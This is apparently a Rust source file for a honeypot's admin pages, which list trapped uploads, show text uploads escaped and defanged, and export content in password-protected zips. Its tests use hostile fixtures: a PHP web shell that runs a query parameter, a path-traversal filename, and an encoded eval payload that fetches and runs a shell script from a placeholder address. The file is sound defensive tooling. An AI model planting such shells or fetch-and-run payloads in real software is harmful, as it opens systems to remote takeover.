//! Admin › Uploads: the files dropped on the trap (MIK-121), their
//! metadata, and the requests later made where each was told it landed.
//! Content is hostile. A text upload is parsed statically and shown
//! escaped; a binary is never parsed, shown, inlined or unpacked here. It
//! leaves only as a download, in a zip encrypted with the password
//! `infected` (a handling convention, not a protection: ZipCrypto is weak).
use crate::admin::AdminState;
use crate::admin::auth::SessionUser;
use crate::admin::error::{AppError, AppResult, render};
use crate::admin::views::Chrome;
use crate::model::xray::{Policy, Source, parse};
use crate::store::browse::{Page, lenient_i64, page_num};
use crate::store::uploads::{self, TimelineRow, UploadRow};
use askama::Template;
use axum::{
    Router,
    extract::{Path, Query, State},
    http::header,
    response::{Html, IntoResponse, Response},
    routing::get,
};
use axum_extra::extract::CookieJar;
use std::sync::Arc;

/// The password of every exported zip, as malware is shared.
pub const ZIP_PASSWORD: &str = "infected";

pub fn routes() -> Router<Arc<AdminState>> {
    Router::new()
        .route("/admin/traps/uploads", get(list))
        .route("/admin/traps/uploads/{uid}", get(detail))
        .route("/admin/traps/uploads/{uid}/content.zip", get(content_zip))
}

#[derive(serde::Deserialize, Default)]
pub struct ListQuery {
    #[serde(default, deserialize_with = "lenient_i64")]
    page: Option<i64>,
    /// Only this address's uploads (the IP page links here).
    #[serde(default)]
    ip: Option<String>,
    /// Only this content's uploads, as 64 hex digits (the hash pivots
    /// link here).
    #[serde(default)]
    sha256: Option<String>,
}

/// A `sha256` query value as its 32 bytes; anything else is a 400.
fn sha256_param(h: &str) -> AppResult<Vec<u8>> {
    data_encoding::HEXLOWER
        .decode(h.trim().to_ascii_lowercase().as_bytes())
        .ok()
        .filter(|b| b.len() == 32)
        .ok_or_else(|| AppError::BadRequest("sha256 must be 64 hex digits.".into()))
}

#[derive(Template)]
#[template(path = "admin_uploads.html")]
struct UploadsPage {
    chrome: Chrome,
    page: Page<UploadRow>,
    /// Query string for the pager (ends in `&`).
    qs: String,
    ip: Option<String>,
    /// The content shown, lowercase hex.
    sha256: Option<String>,
}

async fn list(
    _u: SessionUser,
    State(st): State<Arc<AdminState>>,
    Query(q): Query<ListQuery>,
) -> AppResult<Html<String>> {
    let ip = q.ip.filter(|s| !s.trim().is_empty());
    let hash = match q.sha256.as_deref().filter(|s| !s.trim().is_empty()) {
        Some(h) => Some(sha256_param(h)?),
        None => None,
    };
    let sha256 = hash.as_deref().map(|b| data_encoding::HEXLOWER.encode(b));
    let mut conn = st.store.read.acquire().await?;
    let mut qs: Vec<(&str, &str)> = Vec::new();
    if let Some(a) = &ip {
        qs.push(("ip", a));
    }
    if let Some(h) = &sha256 {
        qs.push(("sha256", h));
    }
    render(&UploadsPage {
        chrome: Chrome::new(true, "admin"),
        page: uploads::list(&mut conn, page_num(q.page), ip.as_deref(), hash.as_deref()).await?,
        qs: if qs.is_empty() {
            String::new()
        } else {
            format!("{}&", serde_urlencoded::to_string(qs).unwrap_or_default())
        },
        ip,
        sha256,
    })
}

#[derive(Template)]
#[template(path = "admin_upload.html")]
struct UploadPage {
    chrome: Chrome,
    u: UploadRow,
    timeline: Vec<TimelineRow>,
    timeline_max: i64,
    /// A text upload opened layer by layer; binaries have none.
    xray: Option<crate::admin::xray::XrayView>,
}

async fn detail(
    _u: SessionUser,
    State(st): State<Arc<AdminState>>,
    Path(uid): Path<String>,
) -> AppResult<Html<String>> {
    let mut conn = st.store.read.acquire().await?;
    let Some(u) = uploads::get(&mut conn, &uid).await? else {
        return Err(AppError::NotFound);
    };
    let timeline = uploads::timeline(&mut conn, &u).await?;
    let xray = uploads::text_for_xray(&mut conn, &u).await?.map(|text| {
        crate::admin::xray::xray_view(&parse(
            Source::Upload {
                name: u.filename.as_deref(),
                text: &text,
                sender: Some(&u.ip),
            },
            Policy::embedded(),
        ))
    });
    render(&UploadPage {
        chrome: Chrome::new(true, "admin"),
        xray,
        u,
        timeline,
        timeline_max: uploads::TIMELINE_MAX,
    })
}

/// The held content as `<sha256>.zip` holding one entry, `<sha256>.bin`:
/// never the client's file name, so no path or double extension rides
/// along. Each download is logged with who took which hash.
async fn content_zip(
    _u: SessionUser,
    State(st): State<Arc<AdminState>>,
    jar: CookieJar,
    Path(uid): Path<String>,
) -> AppResult<Response> {
    let mut conn = st.store.read.acquire().await?;
    let Some((sha, content)) = uploads::content_for_export(&mut conn, &uid).await? else {
        return Err(AppError::NotFound);
    };
    drop(conn);
    let hash = data_encoding::HEXLOWER.encode(&sha);
    // Deflating up to the upload cap is CPU work: off the async workers.
    let zip = {
        let hash = hash.clone();
        tokio::task::spawn_blocking(move || encrypted_zip(&hash, &content))
            .await
            .map_err(anyhow::Error::from)??
    };
    let by = match crate::admin::auth::session_token(&st, &jar) {
        Some(t) => st.store.session_admin_label(&t).await?,
        None => "admin".to_string(),
    };
    tracing::info!(%by, sha256 = %hash, %uid, "admin: upload content exported");
    Ok((
        [
            (header::CONTENT_TYPE, "application/zip".to_string()),
            (
                header::CONTENT_DISPOSITION,
                format!("attachment; filename=\"{hash}.zip\""),
            ),
            (header::X_CONTENT_TYPE_OPTIONS, "nosniff".to_string()),
        ],
        zip,
    )
        .into_response())
}

fn encrypted_zip(hash: &str, content: &[u8]) -> anyhow::Result<Vec<u8>> {
    use std::io::Write;
    use zip::unstable::write::FileOptionsExt;
    let opts = zip::write::SimpleFileOptions::default()
        .compression_method(zip::CompressionMethod::Deflated)
        .with_deprecated_encryption(ZIP_PASSWORD.as_bytes())?;
    let mut w = zip::ZipWriter::new(std::io::Cursor::new(Vec::new()));
    w.start_file(format!("{hash}.bin"), opts)?;
    w.write_all(content)?;
    Ok(w.finish()?.into_inner())
}

#[cfg(test)]
pub(crate) mod tests {
    use crate::admin::devices::tests::{app, send};
    use crate::cluster::record::UploadRec;
    use crate::store::data::Ctx;
    use crate::store::uploads::{Limits, apply_at};
    use axum::body::Body;
    use axum::http::{Request, StatusCode};
    use sha2::Digest;

    /// A standalone upload of `content`, held unless `held` is false.
    pub(crate) async fn upload(
        st: &crate::admin::AdminState,
        uid: &str,
        filename: &str,
        content: &[u8],
        held: bool,
    ) -> UploadRec {
        typed_upload(st, uid, filename, content, held, "php").await
    }

    /// [`upload`] with the type its first bytes sniffed as.
    pub(crate) async fn typed_upload(
        st: &crate::admin::AdminState,
        uid: &str,
        filename: &str,
        content: &[u8],
        held: bool,
        sniffed: &str,
    ) -> UploadRec {
        let r = UploadRec {
            uid: uid.into(),
            request_uid: format!("r-{uid}"),
            ts: "2026-10-01 00:00:00".into(),
            ip: "203.0.113.30".into(),
            kind: "script".into(),
            filename: Some(filename.into()),
            sniffed_type: sniffed.into(),
            size: content.len() as i64,
            sha256: sha2::Sha256::digest(content).to_vec(),
            answered_path: format!("/uploads/{uid}.php"),
            content_state: if held { "held" } else { "dropped_rate" }.into(),
            carries_content: held,
            ..Default::default()
        };
        let mut c = st.store.pool.acquire().await.unwrap();
        let ctx = Ctx {
            origin: None,
            hlc: 1,
        };
        let day = "2026-10-01";
        apply_at(
            &mut c,
            ctx,
            &r,
            Some(content),
            &Limits::default(),
            day,
            None,
        )
        .await
        .unwrap();
        r
    }

    #[tokio::test]
    async fn the_pages_ask_for_a_session() {
        let (st, _cookie, app, _d) = app().await;
        upload(&st, "u1", "a.php", b"<?php", true).await;
        for path in [
            "/admin/traps/uploads",
            "/admin/traps/uploads/u1",
            "/admin/traps/uploads/u1/content.zip",
        ] {
            let (status, h, body) = send(&app, Request::get(path), Body::empty()).await;
            assert_eq!(status, StatusCode::SEE_OTHER, "{path}");
            assert!(
                h[axum::http::header::LOCATION]
                    .to_str()
                    .unwrap()
                    .starts_with("/login")
            );
            assert!(!body.contains("<?php"), "{path}");
        }
    }

    #[tokio::test]
    async fn the_list_escapes_the_file_name_and_holds_back_dropped_content() {
        let (st, cookie, app, _d) = app().await;
        upload(&st, "held", "<b>x</b>", b"<?php echo 1;", true).await;
        upload(&st, "gone", "y.php", b"<?php echo 2;", false).await;
        let get = |path: &'static str| {
            Request::get(path)
                .header("cookie", cookie.clone())
                .header("sec-fetch-site", "same-origin")
        };
        let (status, _, body) = send(&app, get("/admin/traps/uploads"), Body::empty()).await;
        assert_eq!(status, StatusCode::OK);
        assert!(body.contains("&#60;b&#62;x&#60;/b&#62;"), "{body}");
        assert!(!body.contains("<b>x</b>"));
        assert!(!body.contains("<?php"));
        assert!(body.contains("/admin/traps/uploads/held/content.zip"));
        assert!(!body.contains("/admin/traps/uploads/gone/content.zip"));
        assert!(body.contains("content not held"));

        let (status, _, body) = send(&app, get("/admin/traps/uploads/gone"), Body::empty()).await;
        assert_eq!(status, StatusCode::OK);
        assert!(body.contains("content not held") && body.contains("dropped_rate"));
        assert!(!body.contains("content.zip"));
        let (status, _, _) = send(
            &app,
            get("/admin/traps/uploads/gone/content.zip"),
            Body::empty(),
        )
        .await;
        assert_eq!(status, StatusCode::NOT_FOUND);
        let (status, _, _) = send(&app, get("/admin/traps/uploads/nope"), Body::empty()).await;
        assert_eq!(status, StatusCode::NOT_FOUND);
    }

    /// The hash is a pivot (MIK-498): it links to the list filtered to
    /// that content, which lists only it; a value that is no sha256 is a 400.
    #[tokio::test]
    async fn the_hash_pivots_to_the_uploads_of_that_content() {
        let (st, cookie, app, _d) = app().await;
        let a = upload(&st, "ua", "a.php", b"<?php echo 'a';", true).await;
        upload(&st, "ub", "b.php", b"<?php echo 'b';", true).await;
        let hash = data_encoding::HEXLOWER.encode(&a.sha256);
        let get = |path: String| {
            Request::get(path)
                .header("cookie", cookie.clone())
                .header("sec-fetch-site", "same-origin")
        };
        let href = format!("href=\"/admin/traps/uploads?sha256={hash}\"");
        let (status, _, body) =
            send(&app, get("/admin/traps/uploads/ua".into()), Body::empty()).await;
        assert_eq!(status, StatusCode::OK);
        assert!(body.contains(&href), "{body}");
        let (_, _, body) = send(&app, get("/admin/traps/uploads".into()), Body::empty()).await;
        assert!(body.contains(&href), "{body}");

        for q in [hash.clone(), hash.to_uppercase()] {
            let (status, _, body) = send(
                &app,
                get(format!("/admin/traps/uploads?sha256={q}")),
                Body::empty(),
            )
            .await;
            assert_eq!(status, StatusCode::OK);
            assert!(body.contains("/admin/traps/uploads/ua\""), "{body}");
            assert!(!body.contains("/admin/traps/uploads/ub\""), "{body}");
        }
        for bad in ["zz", "abcd", &format!("{hash}00")] {
            let (status, _, _) = send(
                &app,
                get(format!("/admin/traps/uploads?sha256={bad}")),
                Body::empty(),
            )
            .await;
            assert_eq!(status, StatusCode::BAD_REQUEST, "{bad}");
        }
    }

    #[tokio::test]
    async fn the_zip_is_an_encrypted_attachment_named_by_hash() {
        let (st, cookie, app, _d) = app().await;
        let content = b"<?php system($_GET['c']); /* \x00\xff */";
        let r = upload(&st, "z", "../../evil.php.jpg", content, true).await;
        let hash = data_encoding::HEXLOWER.encode(&r.sha256);
        let res = tower::ServiceExt::oneshot(
            app.clone(),
            Request::get("/admin/traps/uploads/z/content.zip")
                .header("cookie", cookie)
                .header("sec-fetch-site", "same-origin")
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
        assert_eq!(res.status(), StatusCode::OK);
        let h = res.headers().clone();
        assert_eq!(h["content-type"], "application/zip");
        assert_eq!(
            h["content-disposition"],
            format!("attachment; filename=\"{hash}.zip\"").as_str()
        );
        assert_eq!(h["x-content-type-options"], "nosniff");
        let zip = axum::body::to_bytes(res.into_body(), usize::MAX)
            .await
            .unwrap();
        assert!(!zip.windows(content.len()).any(|w| w == content));
        let mut a = zip::ZipArchive::new(std::io::Cursor::new(zip.to_vec())).unwrap();
        assert_eq!(a.len(), 1);
        assert!(
            a.by_index(0).is_err(),
            "no entry opens without the password"
        );
        let mut f = a.by_index_decrypt(0, b"infected").unwrap();
        assert_eq!(f.name().unwrap(), format!("{hash}.bin"));
        let mut got = vec![];
        std::io::Read::read_to_end(&mut f, &mut got).unwrap();
        assert_eq!(sha2::Sha256::digest(&got).to_vec(), r.sha256);
    }

    #[tokio::test]
    async fn text_upload_shows_xray() {
        let (st, cookie, app, _d) = app().await;
        let code = "<?php eval(base64_decode('d2dldCBodHRwOi8vMTkyLjAuMi45L3guc2ggLU8tIHwgc2g=')); ?><b>x</b>";
        upload(&st, "t1", "a.php", code.as_bytes(), true).await;
        let req = Request::get("/admin/traps/uploads/t1")
            .header("cookie", cookie)
            .header("sec-fetch-site", "same-origin");
        let (status, _, body) = send(&app, req, Body::empty()).await;
        assert_eq!(status, StatusCode::OK);
        assert!(body.contains("id=\"xray\""), "{body}");
        assert!(
            body.contains("&#60;?php") && body.contains("eval(base64_decode("),
            "{body}"
        );
        assert!(!body.contains("<b>x</b>"));
        assert!(body.contains("hxxp://192[.]0[.]2[.]9"), "{body}");
        assert!(!body.contains("href=\"http://192"), "{body}");
        assert!(body.contains("/admin/traps/uploads/t1/content.zip"));
    }

    #[tokio::test]
    async fn binary_upload_shows_no_xray() {
        let (st, cookie, app, _d) = app().await;
        let elf = b"\x7fELF\x02\x01\x01 MARKELF";
        typed_upload(&st, "b1", "a.bin", elf, true, "elf").await;
        // Text bytes under a binary type are no text either.
        typed_upload(&st, "b2", "b.bin", b"<?php echo 'MARKTXT';", true, "zip").await;
        for uid in ["b1", "b2"] {
            let req = Request::get(format!("/admin/traps/uploads/{uid}"))
                .header("cookie", cookie.clone())
                .header("sec-fetch-site", "same-origin");
            let (status, _, body) = send(&app, req, Body::empty()).await;
            assert_eq!(status, StatusCode::OK);
            assert!(body.contains(&format!("/admin/traps/uploads/{uid}/content.zip")));
            assert!(!body.contains("id=\"xray\""), "{body}");
            assert!(!body.contains("MARKELF") && !body.contains("MARKTXT"));
        }
    }
}
